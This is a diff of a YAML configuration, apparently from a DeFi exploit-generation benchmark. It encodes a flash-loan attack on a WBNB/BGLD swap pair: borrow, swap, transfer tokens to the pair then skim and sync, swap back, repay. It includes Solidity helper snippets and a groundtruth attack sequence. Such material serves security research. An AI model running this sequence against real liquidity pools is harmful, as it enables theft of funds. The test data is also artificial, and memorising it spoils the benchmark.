@@ -17,18 +17,10 @@ ctrt_name2deploy:
   - ["router", ""]
 
 extra_actions:
-  - "function burn_pair_bgld(uint256 amount) internal {
-    bgld.transfer(address(pair), amount * 10);
+  - "function burn_bgld_pair(uint256 amount) internal eurus {
+    bgld.transfer(address(pair), amount);
     pair.skim(attacker);
-    }"
-
-  - "function swap_pair_wbnb_bgld(uint256 amount) internal {
-    address[] memory path = new address[](2);
-    path[0] = address(wbnb);
-    path[1] = address(bgld);
-    uint256[] memory values = router.getAmountsOut(amount, path);
-    wbnb.transfer(address(pair), wbnb.balanceOf(attacker));
-    pair.swap(0, (values[1] * 90) / 100, attacker, '');
+    pair.sync();
     }"
 
 extra_deployments_before:
@@ -41,12 +33,11 @@ extra_statements: []
 attack_goal_str: "wbnb"
 
 groundtruth:
-  - ["borrow", "owner", "wbnb", "125e18"]
-  - ["swap", "pair", "wbnb", "bgld", "wbnb.balanceOf(attacker)"]
-  - ["burn", "pair", "bgld", "bgld.balanceOf(address(pair))"]
-  - ["sync", "pair"]
-  - ["swap", "pair", "bgld", "wbnb", "100 * 1e6"]
-  - ["payback", "owner", "wbnb", "125e18 * 1003 / 1000"]
+  - ["borrow", "wbnb", "owner", "125e18"]
+  - ["swap", "pair", "attacker", "wbnb", "bgld", "wbnb.balanceOf(attacker)", "pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 9 / 10"]
+  - ["burn", "bgld", "pair", "bgld.balanceOf(address(pair)) * 10"]
+  - ["swap", "pair", "attacker", "bgld", "wbnb", "100 * 1e6", "pair.getAmountOut(100 * 1e6, address(bgld))"]
+  - ["payback", "wbnb", "owner", "125e18 * 1003 / 1000"]
 
 roles:
   "wbnb":
@@ -60,7 +51,8 @@ roles:
     is_burnable: true
   "pair":
     is_swappair: true
-    uniswap_order: ["wbnb", "bgld"]
+    is_uniswap: true
+    token_pair: ["wbnb", "bgld"]
     support_swaps:
       "wbnb": ["wbnb", "bgld"]
       "bgld": ["wbnb", "bgld"]
